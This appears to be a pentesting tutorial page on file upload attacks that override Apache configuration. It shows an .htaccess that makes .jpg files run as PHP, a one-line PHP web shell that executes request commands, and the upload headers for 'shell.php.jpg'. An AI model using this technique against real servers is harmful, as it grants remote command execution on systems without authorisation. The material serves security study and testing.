---
description: >-
  Servers typically won't execute files unless they have been configured to do
  so. Furthermore, user-supplied files will be placed in a non-executable
  directory.
---

# Overriding Server Configurations

For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php
```

Many servers also allow developers to create special configuration files to override or add to the global configuration settings. Apache servers, for example, will add a _**.htaccess**_ file if one is present.

On _**IIS**_ servers, a web.config file allows developers to make directory specific configurations.

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```



_<mark style="color:red;">**NOTE:**</mark>_ Web servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file.



### Override with .htaccess file

Upload an _.htaccess_ file with the following:

```
AddType application/x-httpd-php .php
AddType application/x-httpd-php .jpg
```

Upload your malicious file of your choosing.

```
<?php system($_REQUEST["cmd"]); ?>
```



Upload shell.php.jpg

```
Content-Disposition: form-data; filename="shell.php.jpg"
Content-Type: application/x-httpd-php 
```
